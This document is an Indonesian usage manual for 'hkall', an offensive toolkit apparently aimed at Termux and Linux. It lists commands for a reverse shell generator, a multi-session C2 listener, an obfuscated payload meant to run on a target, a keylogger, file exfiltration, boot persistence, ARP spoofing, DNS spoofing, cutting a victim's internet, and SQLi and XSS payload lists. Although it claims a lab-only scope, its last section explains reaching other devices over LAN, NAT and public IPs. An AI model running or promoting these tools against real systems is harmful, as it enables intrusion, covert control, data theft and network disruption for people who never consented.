# hkall — Tata Cara Penggunaan Semua Fitur (Lengkap)

> Target: **device & lab milik sendiri**. Alur inti: `hkall` → TUI menu, atau `hkall -m MOD [--host ...]`.
> Hasil tiap modul → `data/rs.db` → `hkall -m history`.
> Cek semua modul: `hkall --list`. Argumen per modul: `hkall -m MOD --help`.

---

## 0. Instalasi & perintah dasar

```bash
# installment sekali (pkg=Termux, apt/dnf/pacman=Linux)
curl -sL https://github.com/rizqiwidi/hkall/raw/master/install.sh | sh

hkall                # TUI menu (numbered)
hkall --list          # semua modul
hkall --search sql    # filter daftar modul
hkall -m scan --help  # bantuan arg modul
lab server: python3 lab/lab_server.py 8090
```

3 cara jalanin satu modul:
1. **TUI** — `hkall`, ketik nomor modul, jawab prompt.
2. **CLI preset** — `hkall -m scan --host 192.168.1.50 --ports 1-1000` (prompt keisi otomatis).
3. **Orchestrator** — `hkall -m websec` (menu gabung sqli→xss→csrf→idor).

---

## 1. Modul RECON (network / web gather)

### 1.1 scan — Port scanner
**Fungsi:** scan port TCP terbuka + optional banner.
**Prompt:** `target host`, `ports (range)`, `banner grab? [y/N]`.
```bash
hkall -m scan --host 127.0.0.1 --ports 1-1000
hkall -m scan --host 192.168.1.50 --ports 22,80,8080
```
**Output:** `open ([...]): [...ports]` + banner per port + tersimpan rs.db.

### 1.2 enum — Web enumerator
**Fungsi:** fetch URL, cek header/status, ekstrak email/secret/form.
```bash
hkall -m enum --host http://192.168.1.50
hkall -m enum --host https://example.com
```
**Output:** `status <code> headers <n> bytes <n>`, `found: mails/secret/forms`, tersimpan.

### 1.3 whois — DNS/banner lookup
**Fungsi:** resolve host → IPs + reverse PTR.
```bash
hkall -m whois --host example.com
```
**Output:** `IPs: [...]`, tiap IP → PTR, tersimpan.

### 1.4 subd — Subdomain brute
**Prompt:** domain, wordlist path.
```bash
hkall -m subd  # interaktif: domain contoh.com
```
Biar sekali jalan pake file `subd.txt`, data hasil `found`.

### 1.5 lan — LAN host discoverer (probe port umum)
**Prompt:** cidr (`192.168.1.0/24`).
```bash
hkall -m lan --host 192.168.1.0/24
```
**Output:** list IP yang up (22/80/135/139/443/445/3389), tersimpan `kind=lan`.

### 1.6 arp — ARP scan (raw socket, root)
**Prompt:** cidr, interface.
```bash
hkall -m arp  # perlu root
```
**Output:** MAC/IP live host, `kind=arp`.

---

## 2. Modul SHELL / C2 / PAYLOAD

### 2.1 shell — Reverse shell generator
**Prompt:** host (IP attacker yang reachable), port.
**Output:** 5 shell one-liner (py/bash/nc/sh/php), opsi simpan ke config.
```bash
hkall -m shell --host 192.168.1.10 --port 4444
```

### 2.2 c2 — C2 listener (multi-session)
**Prompt:** port. Bind `0.0.0.0`.
**Dalam TUI/CLI**: `sessions | use S1 | kill S1 | exit`, command dikirim ke current session.
```bash
hkall -m c2 --port 4444
```
**Alur:** srv listen → session dari payload (p.2.3) → `use S1` → ketik command → dijalankan di target.
Catatan: c2 butuh tty (`pkg` saja ketika pkg di install dll). Guard anti-crash ada.

### 2.3 payload — Android payload builder
**Prompt:** c2 host, port, obfuscate?.
**Output:** `data/payload.py` — reconnect + XOR.
```bash
hkall -m payload --host 192.168.1.10 --port 4444
# jalankan di target:
python3 data/payload.py
```

### 2.4 exe2 — Shell payload variants
**Prompt:** c2 host, port.
**Output:** termux am vs linux one-liner.

### 2.5 keylog — Keylogger (local)
**Prompt:** duration seconds.
**Output:** `data/keys.log`.

---

## 3. Modul EXFIL

### 3.1 exfil — Exfil client
**Prompt:** listener ip, port, file.
```bash
hkall -m exfil --host 192.168.1.10 --port 12345 --file notes.txt
```
**Alur:** konek ke listener (`recv` di sisi lain), kirim `name|size`, tunggu `K`, kirim chunk.

### 3.2 recv — Exfil server
**Prompt:** port.
```bash
hkall -m recv --port 12345
```
**Output:** file → `data/<name>`, guard traversal + hang (verified), tersimpan.

---

## 4. Modul DEVICE (termux-api)

### 4.1 ops — Device ops
**Prompt:** sub-op (battery/gps/sms/cam/mic/vibrate/clipboard/run-all).
```bash
hkall -m ops   # lalu pilih sub-op
```
Butuh `termux-api` terpasang (`pkg install termux-api`).

### 4.2 wifi — Wifi audit
**Prompt:** [s]can / [c]onnection-info / [q]uit.
```bash
hkall -m wifi
```

### 4.3 persist — Persistence (boot + shell hook)
**Prompt:** on-boot cmd, apply?.
```bash
hkall -m persist
```
Bikin termux-boot script + `~/.bashrc` hook.

### 4.4 serve — HTTP static server
**Prompt:** port, dir.
```bash
hkall -m serve
```
Bind `0.0.0.0` → reachable dari LAN/online (jika port + IP publik). Drop files di `data/serve`.

---

## 5. Modul WEB VULN (plugin websec)

Semua butuh target reachable. `--post` untuk body POST.

### 5.1 sqli — SQLi tester
**Prompt:** url (harus ada param `?x=`), method, POST body (opsional).
```bash
hkall -m sqli --host "http://device_target/sqli.php?x=1"
```
16 payload: `'`, `''`, `' OR 1=1--`, `' OR '1'='1`, `#`, `" OR 1=1--`, ORDER BY, UNION SELECT NULL,
WAITFOR DELAY, SLEEP, `') OR 1=1--`, dll. Banding status 200 vs 500, dan time >2s untuk time-based.
**Output:** `issues: [...]`.

### 5.2 xss — XSS reflection check
**Prompt:** url (harus ada `?q=`).
```bash
hkall -m xss --host "http://device/search.php?q="
```
6 payload: `<script>alert(1)</script>`, `<img onerror>`, `"><svg onload>`, dll. Deteksi reflected vs escaped.
**Output:** `reflected raw: [...]`.

### 5.3 csrf — CSRF check
**Prompt:** action url.
```bash
hkall -m csrf --host http://device/account/change
```
Cek `Set-Cookie` SameSite + token body → `verdict: hardened|review`.

### 5.4 idor — IDOR enumeration
**Prompt:** api url (`/user/{{id}}`), id range, auth header.
```bash
hkall -m idor --host "http://device/api/user/{{id}}" --range 20 --auth "Bearer x"
```
**Output:** daftar accessible id (bukan 404).

### 5.5 mitm — ARP MITM lab (root)
**Prompt:** victim ip, gateway, iface, seconds.
```bash
hkall -m mitm --host 192.168.1.50 --gateway 192.168.1.1 --iface wlan0 --seconds 15
```
ARP spoof; restore otomatis (bangga jempol). Butuh root + AF_PACKET.

### 5.6 dnsspoof — DNS spoof lab (root)
**Prompt:** port, domain, ip.
```bash
hkall -m dnsspoof --domain test.lab --ip 192.168.1.10
```
Fake DNS server (UDP :53) jawab `test.lab -> ip`. Stop ctrl-c.

### 5.6b netcut — Cut internet target (root, netcut-like)
**Prompt:** target ip, gateway, interface, cut seconds.
```bash
hkall -m netcut --host 192.168.1.50 --gateway 192.168.1.1 --iface wlan0 --seconds 10
```
ARP poison: target percaya gateway ada di MAC tidak-terpasang (`00:00:00:00:00:00`) → traffic target→gateway
blackhole → internet target mati sementara. Auto-restore on exit/ctrl-c (cap 120s). Butuh root.

### 5.7 ddos — Load test (bounded)
**Prompt:** url, concurrency (cap 200), duration (cap 60), method.
```bash
hkall -m ddos --host http://device/load
```
**Output:** ok/err/bytes, req/s.

### 5.8 websec — Orchestrator (chain web test)
```bash
hkall -m websec
  [1] web [2] network [3] load
  web: a=sqli b=xss c=csrf d=idor, "auto" = semua berurutan
  target url device sendiri
```

---

## 6. Modul TOOLBOX (external tools)

```bash
hkall -m toolbox
  1. web     2. net     3. recon     4. auth     5. load
  pilih kategori → pilih tool → kalau belum ada, ditawarkan install (pkg/pip/go)
```
Katalog `tools.json` — 24 tool. Detail per tool: baca tabel §C di docs/USAGE.md.

### Yang sudah terpasang di device ini
`tshark`, `mitmdump` (mitmproxy). Sisanya offer install.

### Contoh pakai toolbox (install dulu kalau belum)
```bash
hkall -m toolbox
> 1 (web)
> 1 (sqlmap)
> y (install)
> target url ...
```

---

## 7. Shortcut / fitur CLI

| perintah | arti |
|----------|------|
| `hkall --list` | daftar semua modul |
| `hkall --search sql` | filter daftar |
| `hkall -m MOD --help` | argumen modul |
| `hkall -m MOD --host X --port P --ports R` | preset prompt |
| `hkall -m MOD --out FILE` | save pointer |
| `HKALL_NOPLUGIN=1 hkall --list` | tanpa plugin (cipt riset cepat) |

### TUI
`/query` filter • `i N` info modul • `N` jalankan • `0`/`q` keluar.

---

## 8. Verification (self-check)

```bash
python3 lab/lab_server.py 8090          # nyalakan lab (device sendiri)
hkall -m sqli --host "http://127.0.0.1:8090/sqli?x=1"   # → issues: ['...']
hkall -m idor --host "http://127.0.0.1:8090/user/{{id}}" --range 5  # → [(1,200),(2,200)...]
hkall -m history --limit 10             # hasil tersimpan
```

---

## 9. Menarget device lain / online

Full alur: `docs/ONLINE.md`. Ringkasan:
- **Same LAN**: `--host 192.168.1.x` — direct
- **Reverse shell (NAT)**: target jalanin payload → connect balik ke attacker; VPS relay kalau perlu
- **Port-forward**: router forward → scan IP publik
- Yang local-only: keylog/persist/ops/wifi/mitm/netcut/dnsspoof (butuh akses di tempat tool dijalankan)
